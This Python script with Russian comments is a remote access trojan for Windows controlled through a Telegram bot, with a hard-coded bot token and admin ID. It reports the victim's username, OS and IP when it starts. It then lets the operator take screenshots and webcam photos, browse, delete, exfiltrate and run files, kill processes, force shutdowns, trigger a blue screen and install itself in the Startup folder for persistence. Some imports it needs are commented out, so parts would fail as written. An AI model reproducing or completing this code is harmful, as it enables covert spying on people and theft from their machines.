# -*- coding: utf8 -*-
'''
# Необходимые для установки пакеты
pip install opencv-python
pip3 install python-opencv
pip3 install pytelegrambotapi
pip3 install pypiwin32
#pip3 install pyaudio # реализации с аудио пока нет
pip install pillow
'''

##############################

import os
import sys
#import cv2
#import wave
import time
#import winreg
import socket
#import shutil
#import string
#import smtplib
#import sqlite3
import telebot
#import zipfile
# import pyaudio
import requests
import platform
#import webbrowser
#import subprocess
#from PIL import ImageGrab
from telebot import types
from telebot import util
#from ctypes import *
#from ctypes.wintypes import *


##############################
# Аутентификация
# https://t.me/getmyid_bot
##############################

token = '5258452459:AAF7Zb0XmlaUIEzOUxrj659M8G7JVdS36yE' # токен telegram-бота
adm = '1960249681'   # id администратора (получается у getmyid_bot, ссылка выше)
bot = telebot.TeleBot(token)

##############################
# Инициализация кнопок и меню
##############################

menu = types.ReplyKeyboardMarkup()
btn1 = types.KeyboardButton('/1\n<<')
btn2 = types.KeyboardButton('/2\n>>')
btn3 = types.KeyboardButton('/Screen\n')
btn4 = types.KeyboardButton('/Webcam\n')
btn6 = types.KeyboardButton('/Power\n')

##############################
# Размещение main menu и порядок кнопок
##############################

menu.row(btn1, btn3, btn2)
menu.row(btn4, btn6)


##############################
# Подменю управления питанием
##############################

power_submenu = types.ReplyKeyboardMarkup()
btn1 = types.KeyboardButton('/PowerOff\n')
btn2 = types.KeyboardButton('/Reboot\n')
btn3 = types.KeyboardButton('/CancelMain')
power_submenu.row(btn1, btn2)
power_submenu.row(btn3)

##############################
# Вторая страница main menu
##############################

second_menu = types.ReplyKeyboardMarkup()
btn1 = types.KeyboardButton('/3\n<<')
btn2 = types.KeyboardButton('/4\n>>')
btn3 = types.KeyboardButton('/Files\n')
btn4 = types.KeyboardButton('/Tasklist\n')
btn5 = types.KeyboardButton('/Taskkill\n')
btn6 = types.KeyboardButton('/Autorun\n')
second_menu.row(btn1,btn3, btn2)
second_menu.row(btn4, btn6, btn5)

##############################
# Подменю управления файлами
##############################

files_submenu = types.ReplyKeyboardMarkup()
btn1 = types.KeyboardButton('/CD\n')
btn2 = types.KeyboardButton('/PWD\n')
btn3 = types.KeyboardButton('/Delete\n')
btn4 = types.KeyboardButton('/Download\n')
btn5 = types.KeyboardButton('/Run\n')
btn6 = types.KeyboardButton('/CancelFiles')
files_submenu.row(btn1, btn2)
files_submenu.row(btn3, btn4, btn5)
files_submenu.row(btn6)

##############################
# Подменю управления автозапуском
##############################
autorun_submenu = types.ReplyKeyboardMarkup()
btn1 = types.KeyboardButton('/Startup\n')
btn2 = types.KeyboardButton('/Remove\n️')
btn3 = types.KeyboardButton('/CancelMain')
autorun_submenu.row(btn1)
autorun_submenu.row(btn2)
autorun_submenu.row(btn3)

##############################
# ИСПОЛНЕНИЕ
##############################


try:
 r = requests.get('http://ip.42.pl/raw')
 IP = r.text
 bot.send_message(adm,
 '\nUser online!' +
 '\n ' + '\nPC -> ' + os.getlogin() +
 '\nOS -> ' + platform.system() + ' ' + platform.release() +
 '\n ' +
 '\nIP -> ' + IP,
 reply_markup=menu)
except:
 time.sleep(60)
 os.startfile(sys.argv[0])


#############################
# КОМАНДЫ
#############################

@bot.message_handler(commands=['Start', 'start'])
def start(command):
    bot.send_chat_action(adm, 'typing')

#############################
# Перемещение между меню
#############################

@bot.message_handler(commands=['3'])
def main(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'ok', reply_markup=menu)


@bot.message_handler(commands=['2'])
def main(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'ok', reply_markup=second_menu)


@bot.message_handler(commands=['4', '1'])
def main(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'ok', reply_markup=menu)


#############################
#  Cкриншот экрана
#############################

@bot.message_handler(commands=['Screen', 'screen'])
def screen(command):
    bot.send_chat_action(adm, 'upload_photo')
    screen = ImageGrab.grab()
    screen.save(os.getenv("ProgramData") + '\\Screenshot.jpg')
    screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
    bot.send_photo(adm, screen)
    screen.close()
    try:
        os.remove('C:\\ProgramData\\Screenshot.jpg')
    except:
        print('Error > Screenshot')

#############################
# Фото с web-камеры
#############################

@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
    bot.send_chat_action(adm, 'upload_photo')
    try:
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)
        cap.release()
        webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
        bot.send_photo(adm, webcam)
        webcam.close()
        os.remove('C:\\ProgramData\\Webcam.jpg')
    except:
        bot.send_message(adm, '*Камера не найдена*', parse_mode="Markdown")


#############################
# Управление питанием
#############################

@bot.message_handler(commands=['Power', 'power'])
def power(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, '*Выберите действие*', reply_markup=power_submenu, parse_mode="Markdown")

#############################
# Перезагрузка пк
#############################

@bot.message_handler(commands=['Reboot', 'reboot'])
def reboot(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, '*Компьютер перезагружен! ✔️*', reply_markup=menu, parse_mode="Markdown")
    os.system('shutdown -r /t 0 /f')

#############################
# Выключение пк
#############################

@bot.message_handler(commands=['PowerOff', 'PowerOff'])
def poweroff(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, '*Компьютер выключен! ✔️*', reply_markup=menu, parse_mode="Markdown")
    os.system('shutdown -s /t 0 /f')

#############################
# BSoD (удалил из меню на всякий случай)
# Работает
#############################

@bot.message_handler(commands=['BSoD', 'bsod'])
def bsod(command):
    try:
        bot.send_chat_action(adm, 'typing')
        bot.send_message(adm, '*BSoD Активирован!*', reply_markup=menu, parse_mode="Markdown")
        tmp1 = c_bool()
        tmp2 = DWORD()
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
    except:
        bot.send_message(adm, 'Error > BSoD')


#############################
# Управление файлами (самое интересное, как по мне)
#############################

@bot.message_handler(commands=['Files', 'files'])
def files(command):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'ok', reply_markup=files_submenu)

#############################
# Смена директории
#############################

@bot.message_handler(commands=['CD'])
def cd(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.chdir(user_msg.split("/CD ")[1])
        bot.send_message(adm, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
    except FileNotFoundError:
        bot.send_message(adm, '*Директория не найдена*', parse_mode="Markdown")
    except:
        bot.send_message(adm, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")


@bot.message_handler(commands=['cd'])
def cd(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.chdir(user_msg.split("/cd ")[1])
        bot.send_message(adm, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
    except FileNotFoundError:
        bot.send_message(adm, '*Директория не найдена*', parse_mode="Markdown")
    except:
        bot.send_message(adm, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

#############################
# Удаление объекта
#############################

@bot.message_handler(commands=['Delete'])
def delete(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.remove(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
        bot.send_message(adm, 'Файл *' + user_msg.split("/Delete ")[1] + '* удален!', parse_mode="Markdown")
    except:
        try:
            shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
            bot.send_message(adm, 'Файл *' + user_msg.split("/Delete ")[1] + '* удален!', parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
        except:
            bot.send_message(adm, '*Введите название файла*\n \n/Delete', parse_mode="Markdown")


@bot.message_handler(commands=['delete'])
def delete(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.remove(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
        bot.send_message(adm, 'Файл *' + user_msg.split("/delete ")[1] + '* удален!', parse_mode="Markdown")
    except:
        try:
            shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
            bot.send_message(adm, 'Файл *' + user_msg.split("/delete ")[1] + '* удален!', parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
        except:
            bot.send_message(adm, '*Введите название файла*\n \n/delete', parse_mode="Markdown")

#############################
# Скачивание объекта
#############################

@bot.message_handler(commands=['Download'])
def download(message):
    try:
        user_msg = "{0}".format(message.text)
        download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
        bot.send_chat_action(adm, 'upload_document')
        bot.send_document(adm, download)
    except:
        try:
            shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/Download ")[1],
                                'zip',
                                os.getcwd(),
                                user_msg.split("/Download ")[1])
            bot.send_chat_action(adm, 'upload_document')
            file = open('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip', 'rb')
            bot.send_document(adm, file)
            file.close()
            os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
        except:
            try:
                os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
                bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
            except:
                bot.send_message(adm, '*Введите название файла*\n \n/Download', parse_mode="Markdown")


@bot.message_handler(commands=['download'])
def download(message):
    try:
        user_msg = "{0}".format(message.text)
        download = open(os.getcwd() + '\\' + user_msg.split("/download ")[1], 'rb')
        bot.send_chat_action(adm, 'upload_document')
        bot.send_document(adm, download)
    except:
        try:
            shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/download ")[1],
                                'zip',
                                os.getcwd(),
                                user_msg.split("/download ")[1])
            bot.send_chat_action(adm, 'upload_document')
            file = open('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip', 'rb')
            bot.send_document(adm, file)
            file.close()
            os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
        except FileNotFoundError:
            os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
            bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
        except:
            bot.send_message(adm, '*Введите название файла*\n \n/download', parse_mode="Markdown")

#############################
# Запуск объекта
#############################
@bot.message_handler(commands=['Run'])
def run(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
        bot.send_message(adm, 'Файл *' + user_msg.split("/Run ")[1] + '* запущен!', parse_mode="Markdown")
    except FileNotFoundError:
        bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
    except:
        bot.send_message(adm, '*Введите название файла*\n \n/Run', parse_mode="Markdown")


@bot.message_handler(commands=['run'])
def run(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        os.startfile(os.getcwd() + '\\' + user_msg.split("/run ")[1])
        bot.send_message(adm, 'Файл *' + user_msg.split("/run ")[1] + '* запущен!', parse_mode="Markdown")
    except FileNotFoundError:
        bot.send_message(adm, '*Файл не найден*', parse_mode="Markdown")
    except:
        bot.send_message(adm, '*Введите название файла*\n \n/Run', parse_mode="Markdown")


#############################
# Вывод директории
#############################

@bot.message_handler(commands=['PWD', 'pwd'])
def pwd(commands):
    try:
        bot.send_chat_action(adm, 'typing')
        dirs = '\n``'.join(os.listdir(path="."))
        bot.send_message(adm, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
    except:
        try:
            bot.send_chat_action(adm, 'typing')
            dirse = '\n'.join(os.listdir(path="."))
            splitted_text = util.split_string(dirse, 4096)
            for dirse in splitted_text:
                bot.send_message(adm, '`' + dirse + '`', parse_mode="Markdown")
        except:
            bot.send_message(adm, 'Error > PWD')


#############################
# Выход из подменю
#############################

@bot.message_handler(commands=['CancelFiles', 'cancelfiles'])
def cancelfiles(commands):
    bot.send_chat_action(adm, 'typing')
    bot.send_message(adm, 'ok', reply_markup=second_menu)

#############################
# Отображение списка задач в .txt
#############################

@bot.message_handler(commands=['Tasklist', 'tasklist'])
def tasklist(command):
    try:
        bot.send_chat_action(adm, 'upload_document')
        os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
        tasklist = open('C:\\ProgramData\\Tasklist.txt')
        bot.send_document(adm, tasklist)
        tasklist.close()
        os.remove('C:\\ProgramData\\Tasklist.txt')
    except:
        bot.send_message(adm, 'Error > Tasklist')

#############################
# Завершение указанной задачи
#############################

@bot.message_handler(commands=['Taskkill', 'taskkill'])
def taskkill(message):
    try:
        bot.send_chat_action(adm, 'typing')
        user_msg = "{0}".format(message.text)
        subprocess.call("taskkill /f /im  " + user_msg.split(" ")[1] + '.exe')
        bot.send_message(adm, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!", parse_mode="Markdown")
    except:
        bot.send_message(adm, '*Введите название процесса*\n \n/Taskkill', parse_mode="Markdown")



#############################
# Автозапуск
#############################

@bot.message_handler(commands=['Autorun', 'autorun'])
def autorun(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, '*Выберите действие*', reply_markup=autorun_submenu, parse_mode="Markdown")

#############################
# Добавление в автозапуск
#############################

@bot.message_handler(commands=['Startup', 'startup'])
def startup(commands):
 bot.send_chat_action(adm, 'typing')
 try:
  shutil.copy2((sys.argv[0]), r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' скопирован в автозагрузку! *', parse_mode="Markdown")
  os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' запущен из автозагрузки! *', parse_mode="Markdown")
  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
 except:
  bot.send_message(adm, '*Ошибка*', reply_markup=menu, parse_mode="Markdown")

#############################
# Удаление из автозапуска
#############################

@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
 try:
  shutil.move(sys.argv[0], 'C:\\ProgramData')
  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' удален с компьютера! *', parse_mode="Markdown")
  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
  os.system('taskkill /im ' + os.path.basename(sys.argv[0]) + ' /f')
 except:
  bot.send_message(adm, '*Ошибка*', parse_mode="Markdown")

#############################
# Выход в меню
#############################

@bot.message_handler(commands=['CancelMain', 'cancelmain'])
def cancel(command):
 bot.send_chat_action(adm, 'typing')
 bot.send_message(adm, 'ok', reply_markup=menu)


#############################
#############################
#############################

try:
    bot.polling()
except:
    os.startfile(os.startfile(sys.argv[0]))
    sys.exit()
